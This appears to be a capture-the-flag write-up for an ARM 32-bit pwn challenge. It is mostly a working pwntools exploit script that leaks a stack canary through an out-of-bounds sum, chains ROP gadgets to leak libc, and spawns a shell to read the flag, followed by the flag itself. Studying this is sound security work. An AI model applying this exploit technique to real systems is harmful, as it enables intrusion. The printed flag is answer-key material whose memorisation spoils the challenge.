# speed-1

## Challenge Overview
Name: speed-1
Author: tor
Category: pwn
Description: First three flags get podium points, everyone else gets 50.
Flag format: midnight{...}
Objective: Exploit the ARM 32-bit binary to gain code execution on the remote service and read the flag.

## Files Provided
- speed1
- libc.so.6
- ld-linux.so.3

## Solution Plan
1. Inspect the binary protections and program logic.
2. Identify the stack-based integer array overflow and use the out-of-bounds sum to leak the stack canary.
3. Build an ARM ROP chain using the leaked canary, leak a libc address, calculate libc base, then call `system("/bin/sh")`.
4. Read the flag from the remote service.

## Code (Exploit Script)
```python
#!/usr/bin/env python3
from pwn import *
import re
import time

HOST = "speed1.play.ctf.se"
PORT = 2769

context.clear(arch="arm", os="linux", log_level="info")

elf = ELF("./speed1/speed1", checksec=False)
libc = ELF("./speed1/libc.so.6", checksec=False)

POP_MULTI = 0x1085c
CSU_CALL = 0x10840
MAIN = 0x10698

PUTS_GOT = elf.got["puts"]
PUTS_OFF = libc.sym["puts"]

POP_R0_R5_R6_PC_THUMB = 0x17c18 + 1
SYSTEM = libc.sym["system"]
BINSH = next(libc.search(b"/bin/sh"))

ansi_re = re.compile(rb"\x1b\[[0-9;]*m")

def s32(x):
    x &= 0xffffffff
    return x - 0x100000000 if x & 0x80000000 else x

def linevals(vals):
    return b"".join(str(s32(v)).encode() + b"\n" for v in vals)

def conn():
    io = remote(HOST, PORT, timeout=4)
    io.recvuntil(b"num:")
    return io

def leak_canary():
    io = conn()
    io.send(linevals([1] * 16 + [0]))
    out = io.recvall(timeout=2)
    io.close()

    clean = ansi_re.sub(b"", out)
    m = re.search(rb"res:\s*(-?\d+)", clean)
    if not m:
        return None

    return (int(m.group(1)) - 16) & 0xffffffff

def leak_puts(canary):
    vals = [1] * 16
    vals += [canary, 1, POP_MULTI]
    vals += [1, PUTS_GOT - 4, 1, PUTS_GOT, 1, 1, 1, CSU_CALL]
    vals += [1, 1, 1, 1, 1, 1, 1, MAIN]
    vals += [0]

    io = conn()
    io.send(linevals(vals))

    data = io.recvuntil(b"res:", timeout=4)
    data += io.recvuntil(b"num:", timeout=4)
    clean = ansi_re.sub(b"", data)

    idx = clean.find(b"res:")
    nl = clean.find(b"\n", idx)
    leakline = clean[nl + 1:]
    raw = leakline.split(b"\n", 1)[0]

    puts_addr = u32(raw[:4])
    return io, puts_addr

def get_flag(io, canary, libc_base):
    pop = libc_base + POP_R0_R5_R6_PC_THUMB
    system = libc_base + SYSTEM
    binsh = libc_base + BINSH

    vals = [1] * 16
    vals += [canary, 1, pop, binsh, 1, 1, system, 0]

    io.send(linevals(vals))
    time.sleep(0.2)
    io.sendline(b"cat flag* /flag* 2>/dev/null; exit")
    return io.recvall(timeout=4)

for attempt in range(80):
    canary = leak_canary()
    if canary is None:
        continue

    try:
        io, puts_addr = leak_puts(canary)
        libc_base = (puts_addr - PUTS_OFF) & 0xffffffff
        out = get_flag(io, canary, libc_base)

        print(out.decode("latin1", "replace"))

        m = re.search(rb"midnight\{[^}\n]+\}", out)
        if m:
            print(m.group(0).decode())
            break
    except Exception:
        try:
            io.close()
        except Exception:
            pass
```

## Flag
```txt
midnight{1f762ebc504b1d331c2d2ef8aafd0b67}
```

## Notes
The binary is an ARM 32-bit executable with NX and a stack canary enabled. The program stores parsed integers into a fixed stack array until `0` is entered, but it does not enforce a length limit. Sending 16 values fills the array, and the later sum reads one word past the array, leaking the canary. The exploit then preserves the canary, uses ROP to leak `puts`, calculates libc base, and calls `system("/bin/sh")`.
